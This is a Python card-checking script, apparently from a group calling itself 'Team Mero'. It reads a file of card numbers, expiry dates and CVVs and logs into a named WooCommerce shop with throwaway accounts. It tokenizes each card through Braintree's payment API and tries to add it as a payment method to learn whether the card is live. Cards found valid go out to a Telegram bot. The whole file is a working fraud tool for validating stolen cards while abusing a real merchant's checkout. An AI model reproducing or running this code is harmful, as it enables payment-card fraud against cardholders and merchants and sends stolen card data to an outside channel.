import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
import pyfiglet
import os
import webbrowser
from colorama import Fore
import user_agent
from getuseragent import UserAgent
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
W=Fore.WHITE
L=Fore.BLUE
print(Z+"□■"*30)

ascii_art = pyfiglet.figlet_format("   TEAM MERO ")
print(L+ ascii_art)
print(F+"□■"*30)
webbrowser.open('https://t.me/merospam')
print('\t\033[1;31m>>> Join Me Channel @merospam ');
print('\t\x1b[38;5;153m اذكر المصدر <--');
o=("------------------------------------------------------------")
print(B+o)
combo=input(X+'COMBO NAME :'+X)
y=open(f'{combo}',"+r")
token = input('TOKEN YOUR BOT : ')
ID = input('ID : ')
start_num = 0
F = '\033[2;32m'
Z= '\033[2;31m'
for y in y:
	start_num += 1
	ccx = y.strip().split('\n')[0]
	c = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	acc = ['xogewaf618@inpsur.com','fekeh31776@inpsur.com','gehaj14206@hapied.com']
	time.sleep(5)
	email = random.choice(acc)
	print(F+email)
	user = user_agent.generate_user_agent()
	r = requests.session()
	headers = {'user-agent': user}
	response = r.post(
	    'https://www.fishhuntshoot.com/my-account/add-payment-method/', headers=headers)
	nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
	data = {
    'username': email,
    'password': 'A@Amir5520055',
    'woocommerce-login-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'login': 'Log in',
}
	
	response = r.post(
	    'https://www.fishhuntshoot.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	
	
	nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	time.sleep(9)
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'a384bb6f-323b-47e1-a8c9-6486e2d95482',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': '323 E Pine St',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	import requests
	headers = {'user-agent': user}
	
	data = {
	'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"6d27b02f925be55ac72609f1128fd4d8","fraud_merchant_id":null,"correlation_id":"a384bb6f-323b-47e1-a8c9-6486e2d9"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/mt6frmnwdvsw3q2k/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/mt6frmnwdvsw3q2k"},"merchantId":"mt6frmnwdvsw3q2k","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"mt6frmnwdvsw3q2k","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Fish Hunt Shoot","clientId":"AU5Uy080jyCEq419l-3AT030IprE3_CuVo2dH9g0fGmLLCC1E4PYJosH6VxvgTiIauzF8tr_JiIERYWS","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"fishhuntshoot_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	
	response = r.post(
	    'https://www.fishhuntshoot.com/my-account/add-payment-method/',
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Invalid postal code' in result:
	    print(f'[{start_num}] {ccx} >> {result}✅')
	    requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={ID}&text=
𝗖𝗮𝗿𝗱 -» {ccx}
         
𝗚𝗮𝘁𝗲𝘄𝗮𝘆  -» 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛
 
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
         
𝗕𝗬 :『@Mero_221』""")

	else:
	    print(f'{Z}[{start_num}] {ccx} >> {result}❌')
	time.sleep(5)
